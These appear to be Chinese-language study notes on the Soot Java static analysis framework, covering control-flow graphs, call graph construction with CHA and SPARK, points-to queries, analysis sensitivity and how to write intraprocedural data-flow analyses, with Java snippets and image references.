<p>【相对于ExceptionalUnitGraph】一些很普通的语句也会跳转到异常流程中。（比如nop,goto[?=nop]）—-&gt;<strong>认为try 中包含的所有的语句都有可能触发异常</strong>。</p>
<ul>
<li>边是从trap语句连接到trap handler，例如try块</li>
<li>对于那些隐藏异常抛出的语句，这类图在他们的前驱节点并不会抛出一条边到handler</li>
<li>但是在那些隐藏异常抛出的语句本身会抛出一条语句指向handler</li>
</ul>
<p>通过以下代码对给定的函数创建CFG：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">UnitGraph g = <span class="keyword">new</span> ExceptionalUnitGraph(body);</span><br></pre></td></tr></table></figure>



<h1 id="Host-amp-Tag"><a href="#Host-amp-Tag" class="headerlink" title="Host &amp; Tag"></a>Host &amp; Tag</h1><p> soot层次如下图：</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504174235403.png" alt="image-20210504174235403"></p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504175256326.png" alt="image-20210504175256326"></p>
<p>Tag的接口由Host负责。</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504175753420.png" alt="image-20210504175753420"></p>
<p>Call Graph &amp; Point-to</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504165107321.png" alt="image-20210504165107321"></p>
<h2 id="CG-amp-CFG-amp-ICFG"><a href="#CG-amp-CFG-amp-ICFG" class="headerlink" title="CG &amp; CFG &amp; ICFG"></a>CG &amp; CFG &amp; ICFG</h2><p>CallGraph &amp; Control Flow Graph &amp; Interprocedural Control-Flow Graph</p>
<p>CG代表的是整个程序中方法之间调用关系的图，<strong>图中节点是函数，边代表的是调用关系</strong>。</p>
<p>CFG代表的是一个方法内程序执行流的图，<strong>图中节点是语句组成的基本块，边代表执行流</strong>。</p>
<p>CFG上条件语句节点的后缀会有多个，表示其后可能执行的不同branches。</p>
<p>ICFG就是CG+CFG，可以看作是CG和CFG信息的叠加。ICFG可以看做是给所有方法的CFG加上这些方法之间互相调用的边（CG）所形成的图。调用边（call edge）从调用语句（call site）连到被调方法（callee）的入口。与CG不同的是，ICFG除了调用边，还包含相应的返回边（return edge），从callee的出口连到call site之后执行的下一个语句。</p>
<h2 id="CG-Call-Graph"><a href="#CG-Call-Graph" class="headerlink" title="CG Call Graph"></a>CG Call Graph</h2><p>调用图，调用图是静态分析的关键，方法调用图包含着整个函数调用的关系图。</p>
<p>edge：</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325101740004.png" alt="image-20210325101740004"></p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504163639221.png" alt="image-20210504163639221"></p>
<h4 id="Querying-Call-Graph"><a href="#Querying-Call-Graph" class="headerlink" title="Querying Call Graph"></a>Querying Call Graph</h4><p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504164347627.png" alt="image-20210504164347627"></p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504164650563.png" alt="image-20210504164650563"></p>
<h4 id="Reachable-Methods"><a href="#Reachable-Methods" class="headerlink" title="Reachable Methods"></a>Reachable Methods</h4><p>记录从entry method开始可以到达的方法们</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504164817152.png" alt="image-20210504164817152"></p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504164833065.png" alt="image-20210504164833065"></p>
<h4 id="Transitive-Targets"><a href="#Transitive-Targets" class="headerlink" title="Transitive Targets"></a>Transitive Targets</h4><p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504165304260.png" alt="image-20210504165304260"></p>
<p>CallGraph结构：</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325111055645.png" alt="image-20210325111055645"></p>
<p>Call Graph对象里包含了所有的Edges的集合，同时也包含了了几个关键Map</p>
<ol>
<li>src Map</li>
<li>target Map</li>
<li>unit Map</li>
</ol>
<p>这些Map的Key是SootMethod，Unit而Value是Edge，为了更快的找到SootMethod或者Unit对应的Edge。</p>
<p>CallGraph构建</p>
<p>Call Graph是方法的调用图，要画出方法的调用图是需要起始点的，也就是我们常说的EntryPoint。</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325143900136.png" alt="image-20210325143900136"></p>
<p>在全程序分析的模式下，当一个调用图构建时，我们可以用<code>Scene</code>类里面的<code>getCallGraph</code>方法。</p>
<p>包含3个处理的办法，</p>
<p>CHA     SPARK      Paddle,</p>
<p>其中<strong>默认生成call graph使用的是CHA</strong>，CHA生成速度快，但是是最不准确的。</p>
<p>CHA是最简单的分析方式，它是默认程序中所有的路径都是连通的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">CHATransformer.v().transform();</span><br><span class="line">SootClass a = Scene.v().getClass(<span class="string">"testers.A"</span>);</span><br><span class="line"></span><br><span class="line">SootMethod src = Scene.v().getMainClass().getMethodByName(<span class="string">"doStuff"</span>);</span><br><span class="line">CallGraph cg = Scene.v().getCallGraph();</span><br></pre></td></tr></table></figure>

<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325110830807.png" alt="image-20210325110830807"></p>
<p>这里前提是必须开启全局模式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Options.v().set_whole_program(<span class="keyword">true</span>);</span><br><span class="line">PackManager.v().runPacks();</span><br></pre></td></tr></table></figure>

<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">Options.v().setPhaseOption(<span class="string">"cg.spark"</span>, <span class="string">"on"</span>);<span class="comment">//SPARK生成的call graph更准确</span></span><br><span class="line">Scene.v().loadNecessaryClasses();<span class="comment">//加载相关的类</span></span><br><span class="line"><span class="comment">//设置call graph的入口点</span></span><br><span class="line">SootMethod entryPoint = app.getEntryPointCreator().createDummyMain();</span><br><span class="line">Options.v().set_main_class(entryPoint.getSignature());</span><br><span class="line">Scene.v().setEntryPoints(Collections.singletonList(entryPoint));</span><br><span class="line">System.out.println(entryPoint.getActiveBody());</span><br><span class="line"><span class="comment">//就绪后开始运行</span></span><br><span class="line">PackManager.v().runPacks();</span><br><span class="line"><span class="comment">//获得运行之后的结果。（call graph相关的信息）</span></span><br><span class="line">System.out.println(Scene.v().getCallGraph().size());</span><br></pre></td></tr></table></figure>

<p>这里分析一个简单的程序：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallGraphs</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        doStuff();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doStuff</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> D().foo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        bar();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>soot code：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setupSoot</span><span class="params">()</span></span>&#123;</span><br><span class="line">        G.reset();</span><br><span class="line">        Options.v().set_prepend_classpath(<span class="keyword">true</span>);</span><br><span class="line">        Options.v().set_allow_phantom_refs(<span class="keyword">true</span>);</span><br><span class="line">        Options.v().set_soot_classpath(sourceDirectory);</span><br><span class="line">        Options.v().set_output_format(Options.output_format_jimple);</span><br><span class="line">        Options.v().set_process_dir(Collections.singletonList(sourceDirectory));</span><br><span class="line">        Options.v().set_whole_program(<span class="keyword">true</span>);</span><br><span class="line">        Scene.v().loadNecessaryClasses();</span><br><span class="line">        PackManager.v().runPacks();</span><br><span class="line">        SootClass sootClass = Scene.v().loadClassAndSupport(className);</span><br><span class="line">        sootClass.setApplicationClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        setupSoot();</span><br><span class="line"></span><br><span class="line">        SootClass sootClass = Scene.v().getSootClass(className);</span><br><span class="line">        SootMethod mainMethod = Scene.v().getMainMethod();</span><br><span class="line">        Scene.v().setMainClass(sootClass);</span><br><span class="line"></span><br><span class="line">        PackManager.v().getPack(<span class="string">"wjtp"</span>).add(<span class="keyword">new</span> Transform(<span class="string">"wjtp.myTransform"</span>, <span class="keyword">new</span> SceneTransformer() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">internalTransform</span><span class="params">(String s, Map&lt;String, String&gt; map)</span> </span>&#123;</span><br><span class="line">                CHATransformer.v().transform();</span><br><span class="line">                SootClass d = Scene.v().getSootClass(<span class="string">"DEMO.D"</span>);</span><br><span class="line">                SootMethod src = Scene.v().getMainClass().getMethodByName(<span class="string">"doStuff"</span>);</span><br><span class="line"></span><br><span class="line">                CallGraph cg = Scene.v().getCallGraph();</span><br><span class="line">                Iterator&lt;MethodOrMethodContext&gt; targets = <span class="keyword">new</span> Targets(cg.edgesOutOf(src));</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(targets.hasNext())&#123;</span><br><span class="line">                    SootMethod tgt = (SootMethod) targets.next();</span><br><span class="line">                    System.out.println(src+<span class="string">" may call "</span>+tgt);</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">        PackManager.v().runPacks();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>查看doStuff能调用哪个方法，CHA结果：</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325193501787.png" alt="image-20210325193501787"></p>
<p><strong>发现并不是绝对的准确的结果</strong></p>
<p>备注：</p>
<p>PackMananger是负责进行阶段处理的，它控制着各种执行的运行，<strong>不启动则不会运行相应的阶段</strong>。</p>
<h2 id="Spark"><a href="#Spark" class="headerlink" title="Spark"></a>Spark</h2><p><a href="https://blog.csdn.net/raintungli/article/details/102635324" target="_blank" rel="noopener">Spark</a>分析</p>
<p><a href="https://blog.csdn.net/TheSnowBoy_2/article/details/53414419?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161665612916780261990999%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161665612916780261990999&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~times_rank-12-53414419.pc_v2_rank_blog_default&utm_term=soot" target="_blank" rel="noopener">参考</a></p>
<p>Spark针对的是对于Java的指向分析，支持 基于集合的分析，以及 基于等值的分析。</p>
<p>但是，<strong>Spark提供的是基于上下文不敏感的子集的点对点分析</strong>。</p>
<p>指向分析（points-to）只是SPARK分析的一部分，一系列不同层次，不同方面的分析，可以通过配置options来实现。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap opt = <span class="keyword">new</span> HashMap();</span><br><span class="line">opt.put(<span class="string">"verbose"</span>,<span class="string">"true"</span>);</span><br><span class="line">opt.put(<span class="string">"propagator"</span>,<span class="string">"worklist"</span>);</span><br><span class="line">opt.put(<span class="string">"simple-edges-bidirectional"</span>,<span class="string">"false"</span>);</span><br><span class="line">opt.put(<span class="string">"on-fly-cg"</span>,<span class="string">"true"</span>);</span><br><span class="line">opt.put(<span class="string">"set-impl"</span>,<span class="string">"double"</span>);</span><br><span class="line">opt.put(<span class="string">"double-set-old"</span>,<span class="string">"hybrid"</span>);</span><br><span class="line">opt.put(<span class="string">"double-set-new"</span>,<span class="string">"hybrid"</span>);</span><br><span class="line">SparkTransformer.v().transform(<span class="string">""</span>,opt);</span><br></pre></td></tr></table></figure>

<p>解读：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">- verbose. (设定SPARK在分析过程中，打印多种信息【提示信息】)</span><br><span class="line">- propagator SPARK. (包含两个传播算法，原生迭代算法，基于worklist的算法)</span><br><span class="line">- simple-edges-bidirectional. (如果设置为真，则所有的边都为双向的)</span><br><span class="line">- on-fly-cg.（通过设置此选项，进行更加精确的points-to分析，得到精确的call graph）</span><br><span class="line">- set-impl. (描述points-to集合的实现。可能的值为hash,bit,hybrid,array,double)</span><br><span class="line">- double-set-old以及double-set-new.</span><br></pre></td></tr></table></figure>

<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210504165925735.png" alt="image-20210504165925735"></p>
<p>SPARK运行结果：</p>
<p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210325152047653.png" alt="image-20210325152047653"></p>
<p>解读：</p>
<p>左边列的数字表明，变量初始化的点。（比如：[4,8] Container intersect? false，中的数字表示在第4行初始化的变量，以及在第8行初始化的变量 ） </p>
<p>右边列表示，两个变量的指向的集合中交集是否为空。不空为true,空为false。</p>
<p>【结果分析】可以看出，c1自己与自己是有交集的。c1与c2是没有交集的。（c1, c3也是如此）</p>
<h2 id="Point-to"><a href="#Point-to" class="headerlink" title="Point-to"></a>Point-to</h2><p>interface</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">reachingObjects(Local) 返回指向某个Local变量的指针集合PointsToSet</span><br><span class="line">x = y</span><br><span class="line"></span><br><span class="line">reachingObjects(SootField)  返回指向某个静态属性的指针集合PointsToSet</span><br><span class="line">x = C.f</span><br><span class="line"> </span><br><span class="line">reachingObjects(Local,SootField) 返回指向某个实例对象的field指针集合PointsToSet</span><br><span class="line">x = y.f</span><br><span class="line">  </span><br><span class="line">possibleTypes() 返回某个对象的所有可能类型</span><br><span class="line">returns a set of the possible types of the objects in the points-to set</span><br><span class="line"></span><br><span class="line">hasNonEmptyIntersection(PointsToSet) 判断两个指针集合是否重叠（重叠当然就是alias别名关系）</span><br></pre></td></tr></table></figure>

<h4 id="例子a"><a href="#例子a" class="headerlink" title="例子a"></a>例子a</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">o.m()</span><br><span class="line">如果想知道上面调用中，o对象的所有类型</span><br><span class="line">Local o;</span><br><span class="line">PointsToAnalysis pa = Scene.v().getPointsToAnalysis();</span><br><span class="line">PointsToSet ptset = pa.reachingObjects( o );</span><br><span class="line">java.util.Set types = ptset.possibleTypes()</span><br></pre></td></tr></table></figure>

<h4 id="例子b"><a href="#例子b" class="headerlink" title="例子b"></a>例子b</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">x.f = <span class="number">5</span>;</span><br><span class="line">y.f = <span class="number">6</span>;</span><br><span class="line">z = x.f;</span><br><span class="line">如果想判断x,y是否是别名关系</span><br><span class="line"></span><br><span class="line">Local x, y;</span><br><span class="line">PointsToAnalysis pa = Scene.v().getPointsToAnalysis();</span><br><span class="line">PointsToSet xset = pa.reachingObjects( x );</span><br><span class="line">PointsToSet yset = pa.reachingObjects( y );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(xset.hasNonEmptyIntersection(yset))</span><br><span class="line"><span class="comment">// they’re possibly aliased</span></span><br></pre></td></tr></table></figure>



<h1 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h1><p>在soot里面分为过程内数据流分析和过程间数据流分析。</p>
<p>程序可以看成是状态（数据）和状态之间的转移（控制）两部分，因为状态转移的条件都被忽略了，核心分析的部分是状态数据在转移过程中的变化，所以叫做数据流分析。</p>
<p>首先，总体来说：</p>
<ol>
<li>每个语句相当于一个小的加工厂，加工厂加工需要一定的原料（输入 in）,并且会产生一定的效果（输出 out）。</li>
<li><strong>out = in - kll +gen</strong>这个公式反映了数据流分析的本质，这让数据在语句中真正流动起来（在数据流分析中）。</li>
<li>kill和gen是主要依赖于语句本身的。比如说，a = 100这个语句的作用是将a中之前的值抹去（<strong>kill</strong>）,同时放入 100的值（<strong>gen</strong>）。</li>
<li>out反映的是语句处理之后造成的<strong>后果</strong>。</li>
</ol>
<h2 id="近似分析"><a href="#近似分析" class="headerlink" title="近似分析"></a>近似分析</h2><p>对于IfStmt来说，会出现branch分叉，那么对于汇聚点来说，就会存在Locals的不确定态。</p>
<h3 id="近似的两种级别"><a href="#近似的两种级别" class="headerlink" title="近似的两种级别"></a>近似的两种级别</h3><ul>
<li><p>must</p>
<p>取交集，分析的结果一定<strong>被包含</strong>于正确答案之内。</p>
</li>
<li><p>may</p>
<p>取并集，分析的结果<strong>包含</strong>正确的答案。</p>
</li>
</ul>
<img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210326153604047.png" alt="image-20210326153604047" style="zoom:80%;">

<p>举例：</p>
<img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210326153831632.png" alt="image-20210326153831632" style="zoom:80%;">

<p>may：-2 &lt; a &lt; 5</p>
<p>must: 0  &lt; a  &lt; 2</p>
<h2 id="敏感性"><a href="#敏感性" class="headerlink" title="敏感性"></a>敏感性</h2><p>程序分析的精度通常是和敏感性相关的。主要介绍下面几种敏感性：</p>
<ul>
<li>上下文敏感性  context-sensitivity</li>
<li>路径敏感性      path-sensitivity</li>
<li>流敏感性          flow-sensitivity</li>
</ul>
<p>谭添老师<a href="https://www.zhihu.com/question/35167483" target="_blank" rel="noopener">总结</a>得很好:</p>
<blockquote>
<p>通常所说的xxx-sensitive是指静态分析中用于降低误报（false positive）的技术，最常提的xxx正是所说的path, context以及flow。要具体解释这几个概念，首先我们来看看静态分析怎么产生false positive误报，然后我们再来看看如何用这几个技术（或者说概念）消除相应的false positive。</p>
<p>我们做静态分析时，无论是分析源代码还是目标代码，我们分析的对象（方法、语句、变量）都只有一份：同一个方法我们只会写一个方法体（方法体里的语句也就只有一份），同一个变量我们只会声明一次。然而动态运行程序的时候：</p>
<p>一个方法可能会被调用N次，每次调用的<strong>上下文</strong>可以不一样，不同上下文中这个方法里变量的值会不同；</p>
<p>一个方法里，一个变量在不同<strong>位置</strong>的值也会不一样。例如一个变量v，在方法执行到第1行和第10行的值会不同；</p>
<p>一个方法里同一个位置的变量的值在程序执行不同<strong>路径</strong>时也不一样。例如方法foo第10行要用变量v，第10行之前有一个if-else分支会修改v的值，那么程序途径true branch和false branch到达foo第10行时，v的值又不同。</p>
<p>按照我的理解，xxx-sensitive就是在静态分析时，按照xxx给程序里的对象（模拟动态运行）创建“分身”（或者说按照xxx区分分析对象）：按照<strong>上下文</strong>区分叫做context-sensitive；按照<strong>位置</strong>区分叫做flow-sensitive；按照<strong>路径</strong>区分叫做path-sensitive。区分之后再分析可以减少false positive。但是静态不可能完全模拟动态的所有情况，因为一旦有递归和循环，理论上你写下的方法和变量就能产生无穷无尽的“分身”。所以静态分析只能或多或少地通过xxx-sensitive技术减少false positive，而不可能消除。</p>
</blockquote>
<p>按照定义：path-sensitive最准，flow-次之，context-最差</p>
<h3 id="按照上下文区分：context-sentitive"><a href="#按照上下文区分：context-sentitive" class="headerlink" title="按照上下文区分：context-sentitive"></a>按照上下文区分：context-sentitive</h3><p>在提到context-sensitive 时一般context专指function call context，<strong>方法调用上下文</strong>。</p>
<p>只关心function之间的数据传递（参数、返回值、side-effect）而忽略了同一函数在不同call side下不同的context，即忽略了call stack。将call site和return当作goto，并添加一些赋值语句。</p>
<h3 id="按照位置区分：flow-sentitive"><a href="#按照位置区分：flow-sentitive" class="headerlink" title="按照位置区分：flow-sentitive"></a>按照位置区分：flow-sentitive</h3><p>和前两个相比，flow-sensitive 的概念有些混乱。</p>
<p>flow-sensitive要关注statements之间的先后顺序。</p>
<p>flow-insensitive是把statements当作一个集合来看的，各个statement之间没有顺序，所以control flow statement（if、while一类的）可以直接删除；</p>
<p>从SSA的角度来看，path-insensitive是在处理Phi node的时候丢弃分支的信息，只把各个分支来的所有值给merge。path-sensitive是要保留分支信息。</p>
<h3 id="按照路径区分：path-sentitive"><a href="#按照路径区分：path-sentitive" class="headerlink" title="按照路径区分：path-sentitive"></a>按照路径区分：path-sentitive</h3><p>path-sensitive其实就是flow-sensitive的一个特例，可以看作是特例或者说携带更高精度的信息的做法。</p>
<p>if、while静态分析时不知道动态的执行路线（path），所以一般会把它们不同的分支的数据流集merge起来。<strong>而path-sensitive则针对不同的路径的数据集不会merge，而是分别进行分析</strong>。</p>
<p>举例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  x = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  x = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这段代码的结尾x 的分析结果是<code>如果a &gt; 0 则为1，a &lt;= 0 则为2</code>。</p>
<p>这样分析的精度就高了很多，但是付出的代价是顺着control flow，path 的『分情况讨论』数量随指数增长。当然也有一些优化策略可以在某些情况下降低这个复杂度（比如property simulation）。</p>
<h2 id="soot实现数据流分析"><a href="#soot实现数据流分析" class="headerlink" title="soot实现数据流分析"></a>soot实现数据流分析</h2><p><strong>过程内数据流分析</strong></p>
<p>在sootwiki有说到：</p>
<blockquote>
<p>过程内数据分析是在以UnitGraph为主的cfg上操作的。</p>
<p>UnitGraph包含语句作为节点，如果控制可以从源节点代表的语句流向目标节点代表的语句，那么两个节点之间就有一条边。</p>
<p>数据流分析将两个元素与UnitGraph中的每个节点联系起来，通常是两个集合：一个inset和一个outset。这些集合首先初始化，然后沿着语句节点在UnitGraph中传播，直到达到一个固定点fixed-point。</p>
<p>最后，你要做的就是在每个语句前后检查inset与outset。通过分析的设计，你的集合特征应该准确地告诉你所需要的信息。</p>
</blockquote>
<h3 id="四步走"><a href="#四步走" class="headerlink" title="四步走"></a>四步走</h3><p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210430161058053.png" alt="image-20210430161058053"></p>
<ol>
<li>前向or后向？是否考虑分支情况？</li>
<li>问题域？那种语句会影响？</li>
<li>如何为每一种IR形式的语句写transfer function？</li>
<li>如何说明开始情况下的近似值？</li>
</ol>
<h3 id="义务，必须要做的事情，关键方法"><a href="#义务，必须要做的事情，关键方法" class="headerlink" title="义务，必须要做的事情，关键方法"></a>义务，必须要做的事情，关键方法</h3><p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210430161544317.png" alt="image-20210430161544317"></p>
<p><strong>实现你的分析框架，一定要做的事情</strong>：</p>
<ol>
<li>必须继承FlowAnalysis抽象类</li>
<li>实现抽象方法 ： merge() and copy()</li>
<li>实现数据流分析函数 ：flowThrough()</li>
<li>实现初始化函数：newInitialFlow() and entryInitialFlow()</li>
<li>框架的构造函数内必须调用 doAnalysis()</li>
</ol>
<p><strong>这里面doAnalysis() ，其实soot已经实现了在CFG上运用worklist算法进行程序内数据流分析。</strong></p>
<p><strong>三种数据流分析</strong></p>
<p>ForwardFlowAnalysis：以UnitGraph的<strong>entry statement</strong>作为开始并开始传播；</p>
<p>BackwardsFlowAnalysis：以UnitGraph的<strong>exit node(s)</strong>作为分析并且向后开始传播（当然可以将UnitGraph转换产生inverseGraph，然后再使用ForwardFlowAnalysis进行分析）；</p>
<p>ForwardBranchedFlowAnalysis：本质上也是Forward分析，但是它允许你在不同分支处传递不同的flow sets。例如：如果传播到如if(p!=null)语句处，当“p is not null”时，传播进入“then”分支，当“p is null”时传播进入“else”分支（Forward、backward分析都在分支处会将分析结果merge合并掉）。</p>
<img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210329152634399.png" alt="image-20210329152634399" style="zoom:67%;">

<img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210329152706388.png" alt="image-20210329152706388" style="zoom:67%;">

<p>在soot中，FlowAnalysis是一个抽象类。</p>
<h3 id="ForwardFlowAnalysis"><a href="#ForwardFlowAnalysis" class="headerlink" title="ForwardFlowAnalysis"></a>ForwardFlowAnalysis</h3><p><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210327155003872.png" alt="image-20210327155003872"></p>
<p>ForwardFlowAnalysis是抽象类，继承关系如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AbstractFlowAnalysis&lt;N,A&gt; -&gt; FlowAnalysis&lt;N,A&gt; -&gt; ForwardFlowAnalysis&lt;N,A&gt;</span><br></pre></td></tr></table></figure>

<p>ForwardFlowAnalysis有两个参数：</p>
<ul>
<li><p>N：节点种类。通常是Unit。</p>
</li>
<li><p>A：Abstraction Type 抽象类型。人们通常会用Set和Map来表示，但是，<strong>Soot要求抽象类型必须正确实现equals()和hashCode()方法，这样Soot才能确定何时到达一个固定点</strong>。</p>
</li>
</ul>
<h3 id="关键方法举例"><a href="#关键方法举例" class="headerlink" title="关键方法举例"></a>关键方法举例</h3><img src="../images/soot%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86/image-20210329152722190.png" alt="image-20210329152722190" style="zoom:67%;">

<p><strong>构造函数</strong></p>
<p>必须实现一个携带<code>DirectedGraph</code>作为参数的构造函数，并且将该参数传递给super constructor。然后，在构造函数结束时调用doAnalysis()，doAnalysis()将真正执行数据流分析。而在调用super constructor和doAnalysis之间，可以自定义数据分析结构。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyAnalysis</span><span class="params">(DirectedGraph graph)</span> </span>&#123; <span class="comment">//构造函数</span></span><br><span class="line">  </span><br><span class="line">	<span class="keyword">super</span>(graph);<span class="comment">//传递给父类</span></span><br><span class="line">  </span><br><span class="line">	<span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">	emptySet = <span class="keyword">new</span> ArraySparseSet();<span class="comment">//自定义分析</span></span><br><span class="line">  </span><br><span class="line">	doAnalysis();<span class="comment">//执行fixed-point</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>数据流集合的初始化问题</strong></p>
<p>newInitialFlow &amp; entryInitialFlow</p>
<p>newInitialFlow()方法返回一个抽象类型A的对象，这个对象被赋值给每个语句的in-set和out-set集合，除过UnitGraph的第一个句子的in-set集合（如果你实现的是backwards分析，则是除去exit statement语句）。第一个句子的in-set集合由entryInitialFlow()初始化。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">newInitialFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	<span class="keyword">return</span> emptySet.emptySet();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">entryInitialFlow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	<span class="keyword">return</span> emptySet.emptySet();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>流集合操作</strong></p>
<p>集合复制 copy() </p>
<p><code>copy()</code>方法接收两个A类型的参数，分别是source和target，该方法其实就是把source复制到target集合里面。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(Object source, Object dest)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	FlowSet srcSet = (FlowSet)source,</span><br><span class="line">	FlowSet destSet = (FlowSet)dest;</span><br><span class="line">	srcSet.copy(destSet);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>交汇运算 merge()  </p>
<p>merge(..)方法被用来在control-flow的合并点处合并数据流集，例如：在句子(if/then/else)分支的结束点。与copy(..)不同的是，它携带了三个参数，一个参数是来自左边分支的out-set，一个参数是来自右边分支的out-set，另外一个参数是两个参数merge后的集合，这个集合将是合并点的下一个句子的in-set集合。</p>
